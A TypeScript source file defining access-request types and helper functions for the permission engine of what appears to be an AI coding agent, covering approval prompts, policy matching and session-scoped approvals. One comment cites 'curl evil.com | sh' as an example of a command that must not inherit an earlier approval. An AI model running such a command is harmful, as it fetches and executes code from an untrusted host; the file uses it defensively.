/**
 * AccessRequest (spec §11.1).
 *
 * A tool declares what it is about to do *before* it does it, in terms the
 * policy engine understands. This is the whole point of the resolve/execute
 * split: `resolve()` produces access requests, the policy engine rules on them,
 * and only then does `execute()` run — with an executor already constrained to
 * what was granted.
 *
 * Note `file.read` carries `toModel`. Reading a file into kernel memory to hash
 * it and reading it into the model's context are different capabilities, and the
 * secret boundary lives on the second one.
 */

import type { CanonicalPath } from '../util/paths.ts';

export type Capability =
  | 'file.read'
  | 'file.read_to_model'
  | 'file.write'
  | 'process.exec'
  | 'network.connect'
  | 'secret.use'
  | 'env.read'
  | 'vcs.mutate'
  | 'remote.connect';

export const ALL_CAPABILITIES: readonly Capability[] = [
  'file.read',
  'file.read_to_model',
  'file.write',
  'process.exec',
  'network.connect',
  'secret.use',
  'env.read',
  'vcs.mutate',
  'remote.connect',
];

export interface FileReadAccess {
  kind: 'file.read';
  path: CanonicalPath;
  /** True when the bytes will end up in the model's context. */
  toModel: boolean;
  /** Path as shown to the user; workspace-relative where possible. */
  display: string;
}

export interface FileWriteAccess {
  kind: 'file.write';
  path: CanonicalPath;
  create: boolean;
  display: string;
  /** Byte delta estimate, for the approval prompt. */
  estimatedBytes?: number;
}

export interface ProcessExecAccess {
  kind: 'process.exec';
  executable: string;
  argv: readonly string[];
  cwd: CanonicalPath;
  display: string;
  /** Set when the executable resolved outside a trusted directory. */
  untrustedExecutable?: boolean;
}

export interface NetworkAccess {
  kind: 'network.connect';
  host: string;
  port: number;
  display: string;
  /** The channel this connection belongs to, mirroring EgressKind. */
  via: 'shell' | 'model' | 'hook' | 'plugin' | 'mcp' | 'web' | 'telemetry' | 'update';
}

export interface SecretAccess {
  kind: 'secret.use';
  secretRef: string;
  display: string;
}

export interface EnvironmentAccess {
  kind: 'env.read';
  variables: readonly string[];
  display: string;
}

export interface VcsMutationAccess {
  kind: 'vcs.mutate';
  operation: 'commit' | 'push' | 'branch' | 'reset' | 'tag' | 'stash' | 'other';
  display: string;
}

export interface RemoteAccess {
  kind: 'remote.connect';
  remote: string;
  host: string;
  display: string;
  firstConnection: boolean;
}

export type AccessRequest =
  | FileReadAccess
  | FileWriteAccess
  | ProcessExecAccess
  | NetworkAccess
  | SecretAccess
  | EnvironmentAccess
  | VcsMutationAccess
  | RemoteAccess;

/** The capability a request draws on, used to index policy rules. */
export function capabilityOf(access: AccessRequest): Capability {
  switch (access.kind) {
    case 'file.read':
      return access.toModel ? 'file.read_to_model' : 'file.read';
    case 'file.write':
      return 'file.write';
    case 'process.exec':
      return 'process.exec';
    case 'network.connect':
      return 'network.connect';
    case 'secret.use':
      return 'secret.use';
    case 'env.read':
      return 'env.read';
    case 'vcs.mutate':
      return 'vcs.mutate';
    case 'remote.connect':
      return 'remote.connect';
  }
}

/** The string a rule's `pattern` is matched against. */
export function matchTargetOf(access: AccessRequest): string {
  switch (access.kind) {
    case 'file.read':
    case 'file.write':
      return access.path;
    case 'process.exec':
      return access.executable;
    case 'network.connect':
      return access.host;
    case 'secret.use':
      return access.secretRef;
    case 'env.read':
      return access.variables.join(',');
    case 'vcs.mutate':
      return access.operation;
    case 'remote.connect':
      return access.remote;
  }
}

/**
 * The identity a session-scoped approval is cached against.
 *
 * Deliberately narrow (spec §11.4: "Session Allow 只能缓存具体 subject"). Approving
 * `npm install` once must not approve `curl evil.com | sh` later, so the subject
 * includes the concrete target — not just the capability class.
 */
export function subjectKeyOf(access: AccessRequest): string {
  switch (access.kind) {
    case 'file.read':
      return `file.read${access.toModel ? '_to_model' : ''}:${access.path}`;
    case 'file.write':
      return `file.write:${access.path}`;
    case 'process.exec':
      // argv[0..1] captures `npm install` vs `npm test` without pinning the
      // package name, which would make every install a fresh prompt.
      return `process.exec:${access.executable}:${access.argv.slice(1, 2).join(' ')}`;
    case 'network.connect':
      return `network.connect:${access.via}:${access.host}:${access.port}`;
    case 'secret.use':
      return `secret.use:${access.secretRef}`;
    case 'env.read':
      return `env.read:${[...access.variables].sort().join(',')}`;
    case 'vcs.mutate':
      return `vcs.mutate:${access.operation}`;
    case 'remote.connect':
      return `remote.connect:${access.remote}`;
  }
}

/** One-line human description used in the approval prompt and audit log. */
export function describeAccess(access: AccessRequest): string {
  switch (access.kind) {
    case 'file.read':
      return `read ${access.display}${access.toModel ? ' (into model context)' : ''}`;
    case 'file.write':
      return `${access.create ? 'create' : 'modify'} ${access.display}`;
    case 'process.exec':
      return `run ${access.display}`;
    case 'network.connect':
      return `connect to ${access.host}:${access.port} (${access.via})`;
    case 'secret.use':
      return `use secret_ref://${access.secretRef}`;
    case 'env.read':
      return `read environment: ${access.variables.join(', ')}`;
    case 'vcs.mutate':
      return `git ${access.operation}`;
    case 'remote.connect':
      return `connect to remote "${access.remote}" (${access.host})`;
  }
}
